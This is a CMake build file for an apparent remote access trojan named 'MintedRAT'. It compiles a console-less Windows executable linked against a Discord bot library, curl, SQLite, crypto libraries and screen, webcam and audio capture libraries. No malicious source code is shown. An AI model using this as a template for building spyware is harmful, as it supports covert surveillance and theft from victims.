cmake_minimum_required(VERSION 3.14)
project(MintedRAT LANGUAGES CXX)
set(CMAKE_CXX_STANDARD 17)
find_package(dpp REQUIRED)
find_package(nlohmann_json REQUIRED)
find_package(CURL REQUIRED)
find_package(SQLite3 REQUIRED)
find_package(OpenSSL REQUIRED)
add_executable(MintedRAT minted_rat.cpp)
target_link_libraries(MintedRAT
    dpp::dpp
    nlohmann_json::nlohmann_json
    CURL::libcurl
    SQLite::SQLite3
    OpenSSL::SSL OpenSSL::Crypto
    gdiplus
    ws2_32 crypt32 winhttp bcrypt version ole32 oleaut32 user32 gdi32 comctl32 shell32 advapi32 wbemuuid msimg32 strmiids vfw32 winmm dsound msi iphlpapi wtsapi32 userenv powrprof virtdisk ntdll
)
set_target_properties(MintedRAT PROPERTIES WIN32_EXECUTABLE TRUE)
